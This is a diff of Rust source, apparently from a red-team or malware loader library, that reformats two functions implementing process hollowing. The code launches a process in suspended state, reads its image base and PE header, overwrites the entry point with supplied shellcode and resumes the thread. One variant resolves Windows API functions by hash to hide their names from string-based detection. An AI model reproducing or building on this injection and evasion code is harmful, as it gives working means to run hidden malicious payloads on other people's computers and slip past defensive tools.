@@ -1,4 +1,3 @@
-extern crate windows;
 use std::{mem, ptr};
 use std::ffi::{CString, c_void};
 use windows::core::{PCSTR, PSTR};
@@ -36,7 +35,9 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateProcessA.html
     let lp_application_name: PCSTR = unsafe { mem::zeroed() };
     let mut lp_command_line: PSTR = unsafe { mem::zeroed() };
-    lp_command_line.0 = CString::new(target_process).unwrap().into_raw() as *mut u8;
+    lp_command_line.0 = CString::new(target_process)
+        .unwrap()
+        .into_raw() as *mut u8;
     let lp_current_directory: PCSTR = unsafe { mem::zeroed() };
     let creation_result = unsafe { CreateProcessA(
         lp_application_name,
@@ -118,20 +119,24 @@ pub fn antistring_hollow_and_run(shellcode: &[u8], target_process: &str) {
     let function = rco_utils::find_function_address("Kernel32", 0x6fe222ff0e96f5c4).unwrap();
     let lp_application_name: PCSTR = unsafe { mem::zeroed() };
     let mut lp_command_line: PSTR = unsafe { mem::zeroed() };
-    lp_command_line.0 = CString::new(target_process).unwrap().into_raw() as *mut u8;
+    lp_command_line.0 = CString::new(target_process)
+        .unwrap()
+        .into_raw() as *mut u8;
     let lp_current_directory: PCSTR = unsafe { mem::zeroed() };
     unsafe {
         mem::transmute::<*const (), fn(PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *const PROCESS_INFORMATION) -> BOOL>
-        (function)(lp_application_name,
-                   lp_command_line,
-                   ptr::null(),
-                   ptr::null(),
-                   false,
-                   CREATE_SUSPENDED,
-                   ptr::null(),
-                   lp_current_directory,
-                   &startup_info,
-                   &mut process_information)
+        (function)(
+            lp_application_name,
+            lp_command_line,
+            ptr::null(),
+            ptr::null(),
+            false,
+            CREATE_SUSPENDED,
+            ptr::null(),
+            lp_current_directory,
+            &startup_info,
+            &mut process_information
+        )
     };
 
     // See line 76
@@ -150,7 +155,13 @@ pub fn antistring_hollow_and_run(shellcode: &[u8], target_process: &str) {
     let mut address_buffer = [0; POINTER_SIZE];
     unsafe { 
         mem::transmute::<*const (), fn(HANDLE, *const c_void, *mut c_void, usize, *mut usize)>
-        (function)(process_handle, image_base_address as *const c_void, address_buffer.as_mut_ptr() as *mut c_void, address_buffer.len(), ptr::null_mut())
+        (function)(
+            process_handle,
+            image_base_address as *const c_void,
+            address_buffer.as_mut_ptr() as *mut c_void,
+            address_buffer.len(),
+            ptr::null_mut()
+        )
     };
 
     // See line 96
@@ -159,7 +170,13 @@ pub fn antistring_hollow_and_run(shellcode: &[u8], target_process: &str) {
     let pe_base_address = unsafe { ptr::read(address_buffer.as_ptr() as *const usize) };
     unsafe { 
         mem::transmute::<*const (), fn(HANDLE, *const c_void, *mut c_void, usize, *mut usize)>
-        (function)(process_handle, pe_base_address as *const c_void, header_buffer.as_mut_ptr() as *mut c_void, header_buffer.len(), ptr::null_mut())
+        (function)(
+            process_handle,
+            pe_base_address as *const c_void,
+            header_buffer.as_mut_ptr() as *mut c_void,
+            header_buffer.len(),
+            ptr::null_mut()
+        )
     };
     if header_buffer[0] != 77 || header_buffer[1] != 90 {
         panic!("An offset looks incorrect, the DOS header magic bytes don't correspond to 'MZ'");
@@ -173,13 +190,21 @@ pub fn antistring_hollow_and_run(shellcode: &[u8], target_process: &str) {
     let entry_point_address = entry_point_rva as usize + pe_base_address;
     unsafe { 
         mem::transmute::<*const (), fn(HANDLE, *const c_void, *const c_void, usize, *mut usize)>
-        (function)(process_handle, entry_point_address as *const c_void, shellcode.as_ptr() as *const c_void, shellcode.len(), ptr::null_mut())
+        (function)(
+            process_handle,
+            entry_point_address as *const c_void,
+            shellcode.as_ptr() as *const c_void,
+            shellcode.len(),
+            ptr::null_mut()
+        )
     };
 
     // See line 119
     let function = rco_utils::find_function_address("Kernel32", 0x9f2eb3a0195b21d).unwrap();
     unsafe { 
         mem::transmute::<*const (), fn(HANDLE)>
-        (function)(process_information.hThread)
+        (function)(
+            process_information.hThread
+        )
     };
 }
